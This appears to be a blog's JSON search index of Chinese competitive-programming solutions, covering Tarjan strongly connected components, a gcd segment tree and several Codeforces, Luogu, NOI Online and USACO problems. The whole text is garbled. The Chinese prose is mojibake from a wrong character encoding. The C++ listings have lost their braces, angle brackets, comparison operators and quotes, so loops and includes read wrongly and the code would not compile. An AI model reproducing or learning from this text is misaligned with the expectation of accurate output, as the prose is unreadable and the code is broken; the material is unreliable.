å¼ºè¿é€šåˆ†é‡","path":"/2021/07/03/B3609/","content":"æ¨¡æ¿é¢˜ï¼Œå¼ºè¿é€šåˆ†é‡åœ¨æœ¬æ–‡ä½¿ç”¨ tarjan ç®—æ³•è¿›è¡Œæ±‚è§£ã€‚ é¦–å…ˆæ˜¯æ¦‚å¿µï¼š å¦‚æœåœ¨æœ‰å‘å›¾ $G$ ä¸­çš„ä»»æ„ä¸¤ä¸ªç‚¹éƒ½ç›¸äº’å¯è¾¾ï¼Œåˆ™å›¾ $G$ æ˜¯ä¸€ä¸ªå¼ºè¿é€šå›¾ã€‚ åœ¨æœ‰å‘å›¾ $G$ çš„çš„æ‰€æœ‰å­å›¾ $Gâ€™$ä¸­ï¼Œå¦‚æœ $Gâ€™$ æ˜¯ä¸€ä¸ªå¼ºè¿é€šå›¾ï¼Œåˆ™å›¾ $Gâ€™$ ä¸ºå›¾ $G$ çš„å¼ºè¿é€šå­å›¾ã€‚å¦‚æœä¸€ä¸ªå¼ºè¿é€šå­å›¾ $Gâ€™$ ä¸æ˜¯ä»»ä½•ä¸€ä¸ªå¼ºè¿é€šå­å›¾çš„çœŸå­é›†ï¼Œåˆ™å›¾ $Gâ€™$ ä¸ºå›¾ $G$ çš„æå¤§å¼ºè¿é€šå­å›¾ï¼Œä¹Ÿç§°ä¸º å¼ºè¿é€šåˆ†é‡ã€‚ ç„¶åæ˜¯è§£å†³æ–¹æ³•ï¼š æ³¨ï¼š ä»¥ä¸‹ç”¨ dfn æ•°ç»„è®°å½•è®¿é—®æ¯ä¸ªç‚¹çš„æ—¶é—´ï¼Œç”¨ä¸€ä¸ª low(u) æ¥è¡¨ç¤º $u$ ä»¥åŠå…¶åä»£æœ€å¤šç»è¿‡ä¸€æ¡åå‘è¾¹èƒ½å›åˆ°çš„æœ€æ—©çš„æ—¶é—´æˆ³ã€‚ è‹¥å¼ºè¿é€šåˆ†é‡ä¸­ç¬¬ä¸€ä¸ªè¢«å‘ç°çš„ç‚¹æ˜¯ $u$ï¼Œé‚£ä¹ˆé›†åˆä¸­çš„ç‚¹å¿…ç„¶æ»¡è¶³ä»»æ„ä¸¤ç‚¹ç›¸äº’å¯è¾¾ï¼Œå› æ­¤æœ€å…³é”®çš„å°±æ˜¯æ‰¾å‡ºæ¯ä¸ªå¼ºè¿é€šåˆ†é‡ä¸­çš„ç¬¬ä¸€ä¸ªç‚¹ã€‚è‹¥ç»“ç‚¹ $u$ çš„å­ç»“ç‚¹å‡ºå‘ï¼Œèƒ½åˆ°è¾¾æŸç¥–å…ˆ $w$ï¼Œåˆ™ $w$ ä¸ºç¬¬ä¸€ä¸ªç‚¹ã€‚ä¸éš¾å‘ç°ï¼Œè‹¥æœ‰ low[u] = dfn[u]ï¼Œåˆ™æœ‰ $w = u$ã€‚ ç”¨ stack æ¥å‹å…¥å…ƒç´ è®°å½•ï¼Œå½“å†æ¬¡æ‰¾åˆ°ä¸€ä¸ªå¼ºè¿é€šåˆ†é‡çš„ç¬¬ä¸€ä¸ªç‚¹ $u$ æ—¶ï¼Œåˆ™å¼¹å‡ºå…ƒç´ ç›´è‡³ $u$ã€‚å›  dfs æ¯æ¬¡åªèƒ½æ‰¾åˆ°è‹¥å¹²ä¸ªå¼ºè¿é€šåˆ†é‡ï¼Œæ‰€ä»¥éœ€è¦ä¸æ–­å¼¹å‡ºç„¶åç”¨ set è®°å½•æ¯ä¸€ä¸ªå¼ºè¿é€šåˆ†é‡çš„å…ƒç´ åå¹¶åˆ é™¤ã€ç”¨ä¸€ä¸ªæ•°ç»„è®°å½•æ˜¯å¦å·²ç»è¢«å®‰æ”¾è‡³æŸä¸ªå¼ºè¿é€šåˆ†é‡ä¸­å³å¯ã€‘ï¼Œç›´åˆ°æ‰¾åˆ°æ‰€æœ‰å¼ºè¿é€šåˆ†é‡ã€‚ é¢˜ç›®ä¸­è¯´æ˜éœ€è¦æŒ‰å­—å…¸åºè¾“å‡ºï¼Œå› æ­¤éå† $1-n$ï¼Œç”¨å¸ƒå°”æ•°ç»„è®°å½•è¯¥ç‚¹æ‰€åœ¨å¼ºè¿é€šåˆ†é‡æ˜¯å¦å·²ç»è¾“å‡ºï¼Œè¿™æ ·å°±èƒ½å®Œç¾è§£å†³äº†ï¼ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include cstring#include set#include stackusing namespace std;const int MAX = 1e5 + 5inline int read ();int n,m,cnt,scc_cnt;int to[MAX],nxt[MAX],head[MAX];int dfn[MAX],scc[MAX],low[MAX];bool vis[MAX];stack int s;set int scc_in[MAX];void _add (int u,int v);void dfs (int u);int main () n = read ();m = read (); for (int i = 1;i = m;++i) int u = read (),v = read (); _add (u,v);//æœ‰å‘å›¾æ³¨æ„ä¸€ä¸‹ for (int i = 1;i = n;++i) if (!dfn[i]) dfs (i);//éå† printf (%d ,scc_cnt);//ä¸ªæ•°è¾“å‡º for (int i = 1;i = n;++i) int p = scc[i];//å¯¹åº”çš„å¼ºè¿é€šåˆ†é‡ if (vis[p]) continue;//å·²ç»è¾“å‡ºè¿‡ vis[p] = 1; for (set int :: iterator it = scc_in[p].begin ();it != scc_in[p].end ();++it) printf (%d ,*(it));//set çš„è¾“å‡ºä¸æŒ‡é’ˆæœ‰å…³ puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void _add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void dfs (int u) dfn[u] = low[u] = ++cnt;//æ—¶é—´æˆ³ s.push (u);//å…ƒç´ å‹å…¥ for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) dfs (v); low[u] = min (low[u],low[v]); else if (!scc[v]) low[u] = min (low[u],dfn[v]);//å·²ç»è¿›å…¥æŸä¸ªå¼ºè¿é€šåˆ†é‡çš„è¯å°±åˆ é™¤ if (low[u] == dfn[u])//ç¬¬ä¸€ä¸ªç‚¹ ++scc_cnt;//ä¸ªæ•°åŠ ä¸€ while (1)//å¼¹å‡º int x = s.top (); s.pop (); scc[x] = scc_cnt; scc_in[scc_cnt].insert (x);//è®°å½• if (x == u) break;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7621 [AHOI2021åˆä¸­ç»„] è¶…å¸‚è´­ç‰©","path":"/2021/06/20/P7621/","content":"ç®€å•é¢˜ï¼Œå¤§è‡´çš„é¢˜æ„å°±æ˜¯æ±‚ $(\\sum_{i = 1}^n a_i \\times b_i) \\times 0.85$ï¼Œç„¶åä¿ç•™ä¸€ä½å°æ•°çš„å€¼ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„ä¿ç•™ä¸€ä½å°æ•°æ˜¯ç›´æ¥èˆå»åé¢çš„æ•°å­—ï¼Œè€Œä¸æ˜¯å››èˆäº”å…¥æ±‚å€¼ï¼ å¤„ç†ä¿ç•™ä¸€ä½å°æ•°çš„ä¸¤ç§æ–¹æ³•ï¼š åˆ†ç±»è®¨è®ºï¼Œå¦‚æœå°æ•°éƒ¨åˆ† $0.5$ï¼Œå°±æ•´ä½“å‡å» $0.5$ï¼Œå¦åˆ™ä¸å˜ï¼Œç„¶åç›´æ¥ç”¨ %0.1lf è¾“å‡ºã€‚ ç›´æ¥æ“ä½œ tot = ((int)(tot * 0.85 * 10)) / 10.0ã€‚ å¦å¤–å°±ç›´æ¥ç›¸åŠ å°±å®Œäº‹äº†ã€‚ã€‚ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7; int n,sum;double price,tot;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%d,n); while (n--) scanf (%lf%d,price,sum); tot += price * sum; tot = ((int)(tot * 0.85 * 10)) / 10.0; printf (%0.1lf ,tot); return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1535A Fair Playoff","path":"/2021/06/05/CF1535A/","content":"å¯¹äºæ¯ç»„çš„æ•°æ®ï¼Œå¦‚æœæ˜¯å…¬å¹³çš„ï¼Œé‚£ä¹ˆä¸¤ä¸ªèƒ½åŠ›å€¼æœ€é«˜çš„äººä¸€å®šè¢«åˆ†åœ¨äº†ä¸¤ç»„ä¸­ã€‚è¿™ä¸ªç»“è®ºæ˜¯æ˜¾ç„¶çš„ï¼Œå› ä¸ºå¦‚æœè¢«åˆ†åœ¨ä¸€ç»„ï¼Œé‚£ä¹ˆä¸€å®šä¼šæœ‰ä¸€ä¸ªäººè¾“ï¼Œä¹Ÿå°±æ˜¯ä¸å…¬å¹³çš„ã€‚ æœ‰äº†è¿™ä¸ªç»“è®ºï¼Œæˆ‘ä»¬åªéœ€è¦åˆ¤æ–­èƒ½åŠ›æœ€é«˜çš„ä¸¤äººæ˜¯å¦è¢«åˆ†åœ¨åŒä¸€ç»„å³å¯ã€‚å¯¹äºä¸€ä¸ªæ•°æ®ç±»å‹ pairint,intï¼Œç¬¬ä¸€å…³é”®å­—ä¸ºèƒ½åŠ›å€¼ï¼Œç¬¬äºŒå…³é”®å­—ä¸ºç¼–å·ã€‚é¦–å…ˆé€šè¿‡ sort å‡½æ•°ç”¨ç¬¬ä¸€å…³é”®å­—è¿›è¡Œæ’åºï¼Œç„¶åæ‰¾åˆ°æœ€åä¸¤é¡¹ï¼Œè‹¥ä¸ºç¬¬ $1,2$ ä¸ªäººæˆ–ç¬¬ $3,4$ ä¸ªäººï¼Œä¹Ÿå°±æ˜¯ç¼–å·ä¹‹å’Œä¸º $3$ æˆ– $7$ï¼Œåˆ™è¾“å‡º NOï¼›å¦åˆ™å°±æ˜¯ YESã€‚ è¿™é“é¢˜å¾ˆç®€å•ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n;pair int,int a[5];bool cmp (pair int,int x,pair int,int y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) for (int j = 1;j = 4;++j) a[j].first = read (),a[j].second = j; sort (a + 1,a + 1 + 4,cmp); if (a[3].second + a[4].second == 7 || a[3].second + a[4].second == 3) printf (NO ); else printf (YES ); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (pair int,int x,pair int,int y) return x.first y.first;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF914D Bash and a Tough Math Puzzle","path":"/2021/05/15/CF914D/","content":"è¿™æ˜¯ä¸€é“å‡ ä¹ä¸ºæ¨¡æ¿çš„çº¿æ®µæ ‘è£¸é¢˜ã€‚é¢˜ç›®è¦æ±‚çš„æ˜¯å•ç‚¹æ›´æ–°ï¼ŒåŒºé—´æŸ¥è¯¢ã€‚ å› ä¸ºé¢˜ç›®æ±‚çš„ä¸º $\\gcd$ï¼Œæ‰€ä»¥çº¿æ®µæ ‘åˆå¹¶çš„æ—¶å€™è‚¯å®šè¦å†™æˆ tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1])ï¼Œè‡³äºå¦‚ä½•å†™ gcd (int x,int y) å‡½æ•°ï¼Œåœ¨æ­¤å°±ä¸èµ˜è¿°ã€‚ é¦–å…ˆè®²åŒºé—´æŸ¥è¯¢ã€‚è‡³å¤šä¿®æ”¹ä¸€ä¸ªæ•°ï¼Œè‹¥èƒ½ä½¿å…¶æ»¡è¶³é¢˜æ„åˆ™è¾“å‡º YESï¼Œå¦åˆ™ä¸º NOã€‚å³ä¿®æ”¹çš„æ•°ä¸º $0$ æˆ– $1$ æ—¶ä¸º YESï¼Œå…¶ä½™æƒ…å†µå‡ä¸º NOã€‚å’Œæ™®é€šçº¿æ®µæ ‘çš„æŸ¥è¯¢å·®ä¸å¤šï¼Œä¸è¿‡éœ€è¦ä¼˜åŒ–çš„æœ‰ä¸¤ä¸ªç»†èŠ‚ã€‚ä¸€æ˜¯å½“éœ€è¦ä¿®æ”¹çš„æ•°å·²ç»è¶…è¿‡ $1$ æ—¶ï¼Œå³å¯åœæ­¢ç¨‹åºï¼Œå› ä¸ºç­”æ¡ˆæ­¤æ—¶ä¸€å®šä¸º NOï¼›äºŒæ˜¯è‹¥æ•´æ®µçš„ $\\gcd$ å·²ç»ä¸º $x$ çš„å€æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´è‡³å°‘æŠŠä¸€ä¸ªæ•°ä¿®æ”¹ä¸º $x$ åå°±ä¼šæ»¡è¶³é¢˜æ„ï¼Œæ•…å¯ä»¥åœæ­¢ç¨‹åºä¹‹é—´è¾“å‡º NOã€‚ å…¶æ¬¡æ˜¯å•ç‚¹ä¿®æ”¹ï¼Œååˆ†ç®€å•ï¼Œå‡ ä¹å’Œæ¨¡æ¿çš„ä¿®æ”¹æ²¡æœ‰åŒºåˆ«ã€‚å”¯ä¸€è¦æ³¨æ„çš„æ˜¯åœ¨ä¿®æ”¹åï¼Œçº¿æ®µæ ‘çš„åˆå¹¶æ–¹å¼ä¸º tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1])ï¼Œä¸è¦ä¸ tree[cur] = tree[cur 1] + tree[cur 1 | 1] æ··æ·†ã€‚ æœ€åç»™ä¸€ä¸ªå®Œæ•´ä»£ç ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,cnt,a[MAX],tree[MAX 2];int gcd (int x,int y);void build (int cur,int l,int r);void query (int cur,int l,int r,int x,int y,int v);void modify (int cur,int l,int r,int x,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) a[i] = read (); build (1,1,n); m = read (); for (int i = 1;i = m;++i) int ty = read (); if (ty == 1) int l = read (),r = read (),x = read (); cnt = 0; query (1,1,n,l,r,x); if (cnt 1) printf (NO );//éœ€è¦ä¿®æ”¹çš„å¤§äº 1 åˆ™æ— æ³•å®Œæˆ else printf (YES ); else int x = read (),v = read (); modify (1,1,n,x,v); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int gcd (int x,int y)//è¾—è½¬ç›¸é™¤ if (x y) swap (x,y);//ç¡®å®šå¤§å° return (y == 0) ? x : gcd (y,x % y);void build (int cur,int l,int r) if (l == r) tree[cur] = a[l]; return ; int mid = (l + r) 1; build (cur 1,l,mid); build (cur 1 | 1,mid + 1,r); tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1]);void query (int cur,int l,int r,int x,int y,int v) if (cnt 1 || tree[cur] % v == 0) return ;//ä¼˜åŒ–ç¨‹åºçš„åœ°æ–¹ if (l == r) ++cnt;//éœ€è¦æ”¹åŠ¨çš„æ•°çš„ä¸ªæ•° + 1 return ; int mid = (l + r) 1; if (x = mid) query (cur 1,l,mid,x,y,v); if (y mid) query (cur 1 | 1,mid + 1,r,x,y,v);void modify (int cur,int l,int r,int x,int v) if (l == r l == x) tree[cur] = v;//å•ç‚¹ä¿®æ”¹ return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v); else modify (cur 1 | 1,mid + 1,r,x,v); tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1]);//åˆå¹¶æ–¹å¼è¦æ³¨æ„","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF883M Quadcopter Competition","path":"/2021/05/09/CF883M/","content":"è¿™æ˜¯ä¸€é“æœ‰å…³äºç›´è§’åæ ‡ç³»çš„é¢˜ç›®ï¼Œæ‰‹åŠ¨ç®—ä¸€ä¸‹å°±å¯ä»¥æ‰¾åˆ°è§„å¾‹ã€‚ ä¸éš¾é“æƒ³åˆ°åˆ†ç±»è®¨è®ºï¼Œæˆ‘ä»¬åˆ†ä¸‰ç±»ï¼ˆé£è¡Œå™¨ä¸æ——å­åº”è¯¥ä¸ä¼šé‡å ï¼‰ï¼š $x_1 â‰  x_2$ ä¸” $y_1 â‰  y_2$ã€‚ä¹Ÿå°±æ˜¯æ ·ä¾‹ç»™çš„å›¾ç‰‡ï¼Œæˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹ï¼Œå‘ç°æ¯”æ™®é€šçš„æ±‚ä¸¤ç‚¹é—´çš„ä¸¤å€æ›¼å“ˆé¡¿è·ç¦»åˆå¤šäº† $4$ã€‚æ‰€ä»¥æ­¤æ—¶çš„ç­”æ¡ˆä¸º ${|x_1 - x_2| + |y_1 - y_2|} \\times 2 + 4$ã€‚ $x_1 â‰  x_2$ ä¸” $y_1 = y_2$ã€‚åŒæ ·çš„ï¼Œè¿›è¡Œæ‰‹æ¨ï¼Œå‘ç°è¿™æ¬¡æ˜¯ä¸¤å€æ›¼å“ˆé¡¿è·ç¦»åˆå¤šäº† $6$ã€‚æ‰€ä»¥æ­¤æ—¶çš„ç­”æ¡ˆä¸º ${|x_1 - x_2|} \\times 2 + 6$ã€‚ $x_1 = x_2$ ä¸” $y_1 â‰  y_2$ã€‚ä¸ $2$ çš„æƒ…å†µçš„æœ¬è´¨ç›¸åŒï¼Œä¹Ÿæ˜¯ä¸¤å€æ›¼å“ˆé¡¿è·ç¦»åˆå¤šäº† $6$ã€‚æ‰€ä»¥æ­¤æ—¶çš„ç­”æ¡ˆä¸º ${|y_1 - y_2|} \\times 2 + 6$ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»£ç ï¼š #include iostream#include cstdio#include cmathusing namespace std;inline int read ();int a,b,c,d;int main () a = read ();b = read ();c = read ();d = read (); if (a != c b != d) printf (%d ,2 * (abs (a - c) + abs (b - d)) + 4); if (a == c) printf (%d ,2 * abs (b - d) + 6); if (b == d) printf (%d ,2 * abs (a - c) + 6); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1505D Xenolith? Hippodrome?","path":"/2021/04/22/CF1505D/","content":"æœ¬é¢˜çš„é¢˜é¢ååˆ†ç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»æ•°æ®èŒƒå›´ä¸­ä¸æ ·ä¾‹ä¸­çœ‹å‡ºä¸€äº›ç»†èŠ‚ä¿¡æ¯ã€‚ é¦–å…ˆæ˜¯ $1 \\le N \\le 1024,2 \\le M \\le 16$ï¼Œä» $M$ çš„æ•°æ®èŒƒå›´ä¸­å¾ˆå®¹æ˜“è”æƒ³åˆ° $N$ åœ¨ $M$ è¿›åˆ¶ä¸‹æ‰€è¡¨ç¤ºçš„æ•°ã€‚æŠŠæ ·ä¾‹ä¸­çš„æ•°å­—è¿›è¡Œè½¬æ¢ï¼Œåˆ†åˆ«å¾—åˆ° $(2)_3,(11)_2,(21)_{16},(11)_5$ã€‚å…¶ä¸­ç­”æ¡ˆåˆ†åˆ«åˆ†åˆ«ä¸º $\\texttt{YES,NO,YES,NO}$ï¼Œå› æ­¤å¤§èƒ†çŒœæµ‹æ ¹æ®æ˜¯å¦æœ‰é‡å¤æ•°å­—æ¥åˆ¤æ–­(ä¸å¾—ä¸è¯´è¿™éœ€è¦å¾ˆå¤§çš„è„‘æ´)ã€‚ å› æ­¤æœ€åæœ‰å®Œæ•´ä»£ç ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();bool re[20];int main () int a = read (),b = read (); while (a != 0) if (re[a % b]) puts (NO); return 0; re[a % b] = 1; a /= b; puts (YES); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7472 ã€[NOI Online 2021 å…¥é—¨ç»„] åƒè±†äººï¼ˆæ°‘é—´æ•°æ®ï¼‰ã€‘","path":"/2021/03/28/P7472/","content":"è¿™é“é¢˜å¤§å®¶å¯ä»¥å…ˆç”»ç”»å›¾ï¼Œç„¶åå‘ç°å‘¨å›´é™¤å››ä¸ªè§’çš„ä»»æ„ä¸€ç‚¹å‡ºå‘ï¼Œæ€»èƒ½å›åˆ°è¯¥ç‚¹ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åªæ±‚å‡ºç¬¬ä¸€è¡Œå¼€å§‹éå†çš„æ±‚å’Œç­”æ¡ˆï¼Œæ³¨æ„å››è§’çš„ä¸¤ç‚¹éœ€è¦ç‰¹åˆ¤ï¼ è‡³äºå¦‚ä½•æ±‚ä¸€ä¸ªç¯ä¹‹å’Œï¼Œæˆ‘ä»¬å°±æ‰¾è§„å¾‹ã€‚ä»¤ä¸€å¼€å§‹å¾€å³ä¸‹çš„æ–¹å‘èµ°ï¼Œåˆ™ä¸æ–­ç¢°å£æ›´æ”¹çš„æ–¹å‘ä¾æ¬¡æ˜¯ï¼šå³ä¸‹ - å·¦ä¸‹ - å·¦ä¸Š-å³ä¸Šã€‚ç›´åˆ°å›åˆ°åŸä½ã€‚è¿™æ ·æˆ‘ä»¬æŠŠç¬¬ä¸€è¡Œå…¨éƒ¨éå†åå°±èƒ½åˆ†åˆ«å¾—åˆ°æ¯æ¡è·¯å¾„å¯¹åº”çš„è±†å­æ•°é‡ä¹‹å’Œã€‚æ‰€ä»¥ä¸‹ä¸€æ­¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸¤æ¡ä¸åŒçš„è·¯å¾„å‡å»é‡å¤éƒ¨åˆ†åçš„æœ€å¤§å€¼ã€‚ ä»¥é¢˜ç›®ä¸­çš„å›¾ä¸ºä¾‹ï¼Œæˆ‘ä»¬å†æ¬¡æ‰¾è§„å¾‹ï¼Œè®¾é€‰æ‹©çš„ä¸¤æ¡è·¯å¾„ç¬¬ä¸€è¡Œçš„æ¨ªåæ ‡ä¸º $x,y(x y)$ï¼Œå‘ç°åªæœ‰ç¬¬ä¸€è¡Œä¸¤ç‚¹é—´çš„è·ç¦»ä¸ºå¶æ•°æ—¶æ‰å¯èƒ½å‡ºç°äº¤ç‚¹ã€‚å…¶æ¬¡ï¼Œæ˜“å¾—ä¸¤ç‚¹è·ç¦»ä¸º$y - x$ åˆ™äº¤ç‚¹åˆ†åˆ«åœ¨ä»»æ„ä¸€æ¡è·¯å¾„ä¸æœ€å¤§æ–¹æ¡†äº¤ç‚¹çš„å‘ä¸Šã€ä¸‹ã€å·¦ã€å³çš„ $\\frac{y-x}{2}$ çš„ç‚¹ä¸Šï¼ˆæ„Ÿæ€§ç†è§£ä¸€ä¸‹ï¼Œå°±æ˜¯å¦‚ä¸‹å›¾äºŒç®­å¤´æ‰€æŒ‡çš„å››ä¸ªç‚¹)ã€‚ æ³¨æ„çš„æ˜¯ï¼Œé‡å¤éœ€è¦å‡å»çš„ç‚¹ä¹Ÿæœ‰å¯èƒ½ä¼šæœ‰é‡å ã€‚å› æ­¤ï¼Œéœ€è¦åˆ¤æ–­é‡å¤çš„ç‚¹æ˜¯å¦ç›¸åŒã€‚è¿™ä¸ªåˆ¤æ–­ç”¨ if å°±è¡Œï¼Œåƒä¸‡ä¸è¦ç”¨ä»€ä¹ˆ map ç­‰å»åˆ¤æ–­ï¼ï¼ï¼ æœ€åå‘ä¸€ä¸‹å®Œæ•´ä»£ç ï¼Œæ²¡ç†è§£çš„çœ‹ä¸€ä¸‹å…·ä½“çš„å®ç°ï¼š #include iostream#include cstdio#include algorithm#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e3 + 5;const int MOD = 1e9 + 7;inline int read ();int n,cnt,ans;int a[MAX][MAX],num[MAX];bool vis[MAX];void search (int x,int y,int st);int work (int x,int y);int main () freopen (pacman.in,r,stdin); freopen (pacman.out,w,stdout); n = read (); for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) a[i][j] = read (); for (int i = 1;i = n;++i) cnt = 0; if (i == 1) for (int j = 1;j = n;++j) cnt += a[j][j]; else if (i == n) for (int j = 1;j = n;++j) cnt += a[n - j + 1][j]; else search (1,i,1); num[i] = cnt; for (int i = 1;i = n;++i)//æ‰¾åˆ°æœ€ä¼˜è§£ for (int j = i + 1;j = n;++j) ans = max (ans,work (i,j)); printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void search (int x,int y,int st) if (x == 1) if (vis[y]) return ;//å›åˆ°åŸä½ else vis[y] = 1; cnt += a[x][y];//ç´¯åŠ  //ä¸åŒæ–¹å‘ if (y == 1) st = 3; if (y == n) st = 2; if (x == n) st = 4; if (st == 1) search (x + 1,y + 1,st); if (st == 2) search (x + 1,y - 1,st); if (st == 3) search (x - 1,y + 1,st); if (st == 4) search (x - 1,y - 1,st);int work (int x,int y) int sum = num[x] + num[y],same = 0; if ((y - x) % 2 == 1) return sum;//æ²¡æœ‰äº¤ç‚¹çš„æƒ…å†µ int len = (y - x) / 2; same += a[len + 1][x + len];//åˆ¤é‡å¤çš„æ–¹å‘ï¼Œæ³¨æ„ä¸è¦é‡å¤å‡å»ï¼ï¼ï¼ä¸è¦ç”¨map if (x + len != len + 1) same += a[x + len][len + 1]; if ((n - x) + 1 - len != x + len n - len != 1 + len (n - x) + 1 - len != 1 + len n - len != x + len) same += a[(n - x) + 1 - len][n - len]; if ((n - x) + 1 - len != x + len n - len != 1 + len (n - x) + 1 - len != 1 + len n - len != x + len (n - x + 1) - len != n - len) same += a[n - len][(n - x) + 1 - len]; return sum - same;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7411 [USACO21FEB] Comfortable Cows S","path":"/2021/03/13/P7411/","content":"å°±æ˜¯ä¸€ä¸ªæ·±æœçš„è¿‡ç¨‹ï¼Œæ¯æ¬¡ä¸€å¤´ç‰›åŠ å…¥è¿›æ¥ï¼Œåšä»¥ä¸‹æ“ä½œï¼š åˆ¤æ–­è¯¥ä½ç½®æ˜¯å¦å·²ç»æœ‰ç‰›ã€‚è‹¥å·²ç»æœ‰ç‰›ï¼Œåˆ™è¯´æ˜ä¹‹å‰çš„æ“ä½œå¿…é¡»ä½¿è¯¥ä½ç½®æœ‰ç‰›æ‰æœ€ä¼˜ï¼Œå› æ­¤æ­¤æ—¶å¯ä»¥å°†ç­”æ¡ˆå‡å» $1$ã€‚ åˆ¤æ–­è¯¥ä½ç½®æ˜¯å¦æ»¡è¶³é¢˜æ„ã€‚ åˆ¤æ–­è¯¥ä½ç½®çš„å››ä¸ªç›¸é‚»ä½ç½®æ˜¯å¦æ»¡è¶³é¢˜æ„ã€‚ è‹¥æœ‰æ–°åŠ ç‰›ï¼Œåˆ™éœ€é‡å¤æ­¥éª¤ $2,3$ï¼Œåˆ¤æ–­æ–°åŠ ç‰›çš„ä½ç½®ã€‚ å¯¹äºåˆ¤æ–­æ˜¯å¦æ»¡è¶³é¢˜æ„ï¼Œåªéœ€åˆ¤æ–­è¯¥ç‚¹å‘¨å›´ç‰›çš„ä¸ªæ•°æ˜¯å¦ä¸º $3$ã€‚ bool check (int x,int y) if (!vis[x,y]) return 0;//è‹¥è¯¥ç‚¹æ²¡æœ‰ç‰›ï¼Œåˆ™ä¸ç”¨åˆ¤æ–­ int sum = 0; for (int i = 0;i 4;++i) int newx = x + dx[i],newy = y + dy[i]; if (vis[newx,newy]) ++sum; if (sum == 3) return 1;//åˆšå¥½ä¸ºä¸‰ä¸ª else return 0; å…·ä½“é‡å¤æœç´¢çš„è¿‡ç¨‹å°±æ˜¯ä¸€ä¸ªè£¸è£¸çš„ $\\texttt{dfs}$ï¼Œå†™çš„å’Œå…¶å®ƒå¤§ä½¬çš„å·®ä¸å¤šï¼Œå°±ä¸å±•ç¤ºäº†ã€‚ è‡³äºé¢˜ç›®ä¸­çš„â€œæ³¨æ„åŠ å…¥çš„å¥¶ç‰›çš„ $x$ å’Œ $y$ åæ ‡å¹¶ä¸ä¸€å®šéœ€è¦åœ¨èŒƒå›´ $0 \\ldots 1000$ å†…ã€‚â€ï¼Œæˆ‘æ˜¯ç›´æ¥ä½¿ç”¨ STL ä¸­ mapï¼Œmap pair int,int,bool vis; æ¥å®ç°å¯¹è´Ÿæ•°çš„å‚¨å­˜çš„ã€‚ä½†æ˜¯å®æµ‹é€Ÿåº¦è¾ƒæ…¢ï¼Œè¦å¸æ°§æ‰èƒ½è¿‡ï¼Œå› æ­¤è¾ƒå¥½çš„æ–¹æ³•æ˜¯å¯¹è¾“å…¥çš„åæ ‡å‡åŠ 